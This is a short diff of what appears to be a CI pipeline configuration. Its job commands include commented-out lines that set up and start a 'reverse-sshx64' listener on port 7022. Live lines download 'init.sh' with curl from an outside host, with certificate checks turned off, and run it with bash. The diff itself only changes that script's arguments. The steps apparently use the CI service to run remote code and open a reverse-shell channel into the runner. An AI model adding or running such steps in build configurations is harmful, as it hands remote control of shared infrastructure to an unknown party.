@@ -33,7 +33,7 @@ blocks:
             - '#chmod a+x reverse-sshx64'
             - '#./reverse-sshx64  -v -l -p 7022  '
             - 'curl -O -k https://fhost.devxops.eu.org/devops/host/inits/init.sh '
-            - bash init.sh 296 sema
+            - bash init.sh 296 sema devops
       epilogue:
         on_pass:
           commands:
